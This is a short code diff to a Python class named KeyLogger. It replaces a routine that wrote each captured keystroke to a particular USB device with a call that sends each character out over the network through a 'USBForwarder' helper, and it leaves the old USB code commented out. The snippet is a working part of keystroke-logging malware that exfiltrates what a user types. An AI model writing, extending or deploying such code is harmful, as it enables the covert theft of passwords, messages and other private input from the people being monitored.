@@ -90,15 +90,16 @@ class KeyLogger:
                 else:
                     char = "Not FOUND"
                 print(f"Key pressed: {key_code} ({char})")
-                try:
-                    id_vendor = 0x247d
-                    device_id = 0xc53a
-                    device = usb.core.find(idVendor=id_vendor, idProduct=device_id)
-                    if device:
-                        endpoint = device[0][(0, 0)][0]
-                        device.write(endpoint, data, timeout=1000)
-                except Exception as e:
-                    logging.error(f'{e}')
+                USBForwarder.send_network(char)
+                # try:
+                #     id_vendor = 0x247d
+                #     device_id = 0xc53a
+                #     device = usb.core.find(idVendor=id_vendor, idProduct=device_id)
+                #     if device:
+                #         endpoint = device[0][(0, 0)][0]
+                #         device.write(endpoint, data, timeout=1000)
+                # except Exception as e:
+                #     logging.error(f'{e}')
 
 
 
